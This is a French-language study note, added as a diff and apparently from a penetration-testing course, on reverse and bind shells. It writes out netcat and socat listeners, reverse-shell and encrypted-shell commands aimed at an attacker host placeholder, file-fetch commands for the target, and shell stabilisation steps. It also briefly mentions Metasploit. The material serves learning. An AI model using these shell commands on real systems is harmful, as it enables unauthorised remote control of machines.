@@ -1,0 +1,107 @@
+Liens pour avoir des shells dans pleins de languages :
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+https://github.com/danielmiessler/SecLists
+
+De plus Kali viens avec pleins de webshells pré-installés dans : /usr/share/webshells  .
+
+Un shell est ce que l'on utilise lorsque l'on est face à un CLI (Command Line environment). Donc par exemple, bash, zsh, sh, sont des shells pour Linux, cmd.exe et Powershell en sont d'autres pour Windows.
+Lorsque l'on cible des systèmes à distance, il est possible de forcer une application sur le serveur distant à executer du code arbitrairement choisi. Quand cela arrive, on utilise cet accès initial pour obtenir un shell sur la machine cible.
+Bref, on peut forcer le serveur à soit nous donner un accès aux lignes de commandes (reverse shell), ou d'ouvrir un port sur lequel on peut se connecter pour executer des commandes (bind shell).
+
+Les reverse shell existent quand on force la cible à executer du code qui va la connecter à notre machine. Sur notre propre machine, on va utiliser des outils pour écouter et recevoir la connection et le shell. Les reverse shell sont une bonne manière de contourner les règles des firewall, mais la contrepartie est qu'il faut configurer notre réseau correctement pour qu'il accepte la connection entrante.
+
+On a un bind shell quand du code executé sur la cible est utilisé pour lancer une écoute attachée à un shell directement sur la cible. Cela sera accessible via internet, impliquant que l'on peut se connecter sur le port choisi dans le code et obtenir de l'execution de code à distance par ce moyen. Cela à l'avantage de ne pas nécessiter de configuration personnelle, mais peut être empeché par les firewalls de la cible.
+
+Un shell peut être interactif ou non-interactif.
+Un shell interactif est ce que l'on est habitué à utiliser, bash, zsh, Powershell ... Ils permettent d'intéragir avec des programmes après les avoir lancés (par exemple quand on se connecte avec SSH et que l'on nous demande de rentrer un password).
+Un shell non-intéractif nous limite à utiliser des programmes qui ne nécessitent pas d'intéractions de l'utilisateur pour fonctionner correctement. Malheureusement, la majorité des bind/reverse shell est non-interactif.
+
+NETCAT
+
+Couteau suisse du networking, utilisé pour faire toutes sortes d'interactions réseau, et en particulier recevoir des reverse shell et se connecter à des ports distants ayant un bind shell sur le système cible. Les shell Netcat sont très instables (facile de les perdre), mais il y a des techniques pour les améliorer.
+
+Pour 'écouter' avec netcat, la syntaxe est la suivante : 
+nc -lvnp <port-number> ; -l pour dire que l'on écoute ; -v pour mettre le mode verbose ; -n pour dire à netcat de ne pas chercher à resolve le host name ou utiliser des DNS (en gros on dit qu'on met directement une ip) ; -p pour indiquer le port sur lequel écouter. Attention : si on écoute sur un port en dessous de 1024, il faudra executer la commande en tant que sudo, mais c'est générallement une bonne idée de mettre un port classique pour bypass le firewall.
+
+Pour se connecter à un bind shell avec netcat, la syntaxe est simple : 
+nc <target-ip> <chosen-port>
+
+Une fois que l'on est connecté à un shell, il faut le stabiliser. Par défaut, Ctrl + c tue tout le processus, il est non intéractif, et a des erreurs de formatage, bref c'est la galère. Cela est principlament du au fait que les shell netcat sont des processus tournant au seins d'un terminal, et pas des terminaux authentiques. Il y a pleins de méthodes pour stabiliser un shell Linux, pour Windows c'est plus dur.
+
+Avec Python : Applicable seulement à Linux car a python par défaut (mais marche sur une machine qui a python en général). Il y a trois étapes : 
+Lancer ` python -c 'import pty;pty.spawn("/bin/bash")' ` qui utilise python pour avoir un meilleur shell bash (des fois il faudra préciser la version de python, 2 ou 3). Il manque encore l'autocomplétion, les flèches directionnelles, et Ctrl + C pour tuer des programmes et pas le shell.
+Ensuite on lance ` export TERM=xterm ` qui va donner accès à des commandes comme clear.
+Finalement, on fait Ctrl + z pour background le shell, ` stty raw -echo; fg ` dans notre propre shell qui fait deux choses : désactiver l'echo de notre propre terminal (qui donne accès à l'autocomplétion, arrow keys et Ctrl + c) ; et met le shell en premier plan, complétant la stabilisation.
+NB : si le shell meurt, aucun de nos input ne sera vu dans notre terminal, il faut faire ` reset ` pour retrouver l'accès à notre machine.
+
+Avec rlwrap : rlwrap est un programme qui donne accès à l'historique, l'autocomplétion et les flèches dès que l'on reçoit un shell. Cependant des étapes de stabilisation doivent encore êtres effectuées manuellement si l'on veut utiliser Ctrl + c pour tuer les programmes et pas notre shell.
+` rlwrap nc -lvnp <port> ` ; Ajouter rlwrap au début de notre commande va donc nous donner un meilleur shell, et c'est pratique pour les shells windows qui sont chiants. Sur Linux, on peut compléter la stabilisation avec Ctrl + z et ensuite ` stty raw -echo; fg `.
+
+Avec socat : cette technique est limitée à Linux, un shell socat sur windows étant aussi instable qu'un shell netcat. La méthode consiste à d'abord obtenir un shell netcat, puis de l'utiliser pour se fournir un shell socat plus utile. Pour faire cela, on importe un 'scoat static compiled binary' sur la machine ciblée, qui est une version compilée de socat qui n'a pas de dépendances. Un manière de faire ça est de lancer un serveur sur la machine attaquante, dans le dossier contenant la version à importer : 
+` sudo python3 -m http.server <port> ` ; puis sur la machine cible utiliser le shell netcat pour download le fichier : 
+` wget <LOCAL-IP>/socat -O /tmp/socat `.
+Il est envisageable de faire la même chose sur Windows avec Powershell, en utilisant Invoke-WebRequest (ou un webrequest system class).
+` Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe `
+
+En plus des techniques montrées ci-dessus, il est aussi utile de changer la taille du terminal pour que les éditeurs de texte fonctionnent correctement (et c'est plus joli). Pour faire cela, on tappe ` stty -a ` pour avoir les caractéristiques de notre shell ; il faut garder les valeurs de 'rows' et 'columns', puis les rentre dans le shell distant avec : `stty rows <number>` et `stty cols <number>`.
+
+
+
+SOCAT
+
+Netcat sous stéroïdes, fait la même chose et BEAUCOUP plus. En particuler les shells Socat sont beaucoup plus stables, mais il y a des désaventages : La syntaxe est dure, et il est rarement installé par défaut sur les distributions Linux.
+
+Il faut visualiser socat comme un connecteur entre deux points. Ici ce sera le port qui écoute et notre clavier, mais on peut le faire entre un port et un fichier, entre deux ports, etc ...
+
+Les reverse shell : la syntaxe pour un écouter un reverse shell basique est :
+` socat TCP-L:<port> - ` . Equivalent à la commande de netcat.
+Pour se connecter en retour, il faut utiliser les commandes suivantes sur les machines ciblées :
+Sur Windows : `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` l'option pipes permet de forcer powershell à utiliser le format Unix.
+Sur Linux : `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`
+
+Les bind shell : pour se connecter sur le port attaché au shell : 
+` socat TCP:<TARGET-IP>:<TARGET-PORT> - `
+Pour attacher un shell au port, on utilise les commandes suivantes sur la machine ciblée : 
+Sur Windows : ` socat TCP-L:<PORT> EXEC:powershell.exe,pipes ` 
+Sur Linux : ` socat TCP-L:<PORT> EXEC:"bash -li" `
+
+Socat permet cependant de faire d'autres choses, comme obtenir un reverse shell totalement stable, ce qui est très utile. Nouvelle syntaxe pour l'attaquant : 
+` socat TCP-L:<port> FILE:`tty`,raw,echo=0 ` , qui va en plus de l'ancienne alouer un nouveau tty, et mettre l'echo à 0. C'est équivalent à `stty raw -ech; fg` . 
+Cependant pour la première technique, la machine écoutée pouvait être connectée avec n'importe quel payload, mais celui ci a besoin d'avoir socat installé, il faut donc upload un 'precompiled socat binary', car la plupart des machines n'ont pas socat installé. Syntaxe pour la machine compromise : 
+` socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane ` . La première partie de la commande lie la machine cible avec notre machine, la seconde crée une session bash interactive avec EXEC:"bash -li" , et ajoute différents arguments : pty (alloue un pseudo-terminal sur la cible, permet de stabiliser) ; stderr (s'assure qu'aucun message d'erreur ne s'affiche dans le shell, ce qui pourrait être problématique quand il est non-interactif) ; sigint (permet de kill les commandes dans le shell avec Ctrl + c) ; setsid (crée le processus dans une nouvelle session) ; sane (stabilise le terminal, tente de le normaliser).
+
+De plus, socat a la possibilité de créer des shell cryptés, que ce soit bind ou reverse. Pour faire cela, il suffit de remplacer TCP dans toutes les lignes de commandes précédentes par OPENSSL. Cependant il faut d'abord générer un certificat. Dans un premier temps sur la machine attaquant : 
+` openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt ` 
+va créer une clé 2048 bits RSA avec un certificat associé, signé, valide pour a peine un an. Cette commande nous demande de remplir des infos concernant le certificat, qui peuvent être remplies ou non, et avec n'importe quoi. Il faut ensuite rassembler les deux fichiers créés en un .pem : ` cat shell.key shell.crt > shell.pem `.
+ATTENTION : il faut que le fichier shell.pem soit présent sur les deux machines.
+Une fois cela fait : 
+
+Pour un reverse shell, on setup la machine cible :
+` socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - ` 
+verify=0 indique que la connection ne doit pas essayer de regarder si notre certificat a été signé par une entité valide.
+Pour se connecter au reverse shell, on fait :
+` socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash `
+
+Pour un bind shell, on setup la machine cible : 
+` socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes `
+Puis sur l'attaquant :
+` socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - `
+
+On peut aussi utiliser la technique spéciale dédiée à Linux vu précédemment.
+
+
+METASPLOIT-multi/handler
+
+Le module auxiliary/multi/handler de Metasploit est utilisé pour recevoir des reverse shell. Comme il fait partie de Metasploit, il a accès à une enorme quantité d'outils pour obtenir des shell stables, et aussi les améliorer. C'est aussi la seule façon de communiquer avec un meterpreter shell, et la plus simple pour manipuler des 'staged payloads'.
+
+
+
+MSFVENOM
+
+C'est aussi une partie de Metasploit, mais il est donnée comme un outil à part entière. Permet de générer des payloads à la volée, mais aussi pleins d'autres choses. C'est un outil TRES puissant.
+
+
